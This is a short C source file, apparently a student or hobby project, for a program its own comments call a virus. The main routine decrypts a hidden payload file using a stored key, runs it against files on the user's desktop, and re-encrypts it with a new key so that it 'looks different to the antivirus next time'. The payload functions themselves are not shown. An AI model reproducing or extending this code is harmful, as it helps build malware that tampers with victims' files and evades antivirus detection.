#include "Xichigan.h"

/*********************************************************************************
* Author: Laine Rumreich								       				 				   *
*																				 							*
*																				 							*
* How to compile: make										 					 					*
* How to run: ./xichigan                 									 	 				*
**********************************************************************************/

int main(int argc, char*argv[]) {
	int key; // Encryption key
	FILE *fp;
 
	/* 
		Decrypt the file MtoX.c using the key in key.txt
	*/
	// Get the key from key.txt
	fp = fopen("key.txt","r");
	fscanf (fp, "%d", &key); 
	fclose(fp);

	// Decrypt the files needed to run the virus
	decryptFile(key);

	/* 
		Run MtoX on files on the user's desktop 
	*/
	MtoX();

	/* 
		Encrypt File 
	*/
	// Generate a new key and put it in the file key.txt
	key = 8; // TODO randomize

	// Encrypt the file MtoX using the key so it looks different to the antivirus next time
	encryptFile(key);

	return 0;
}


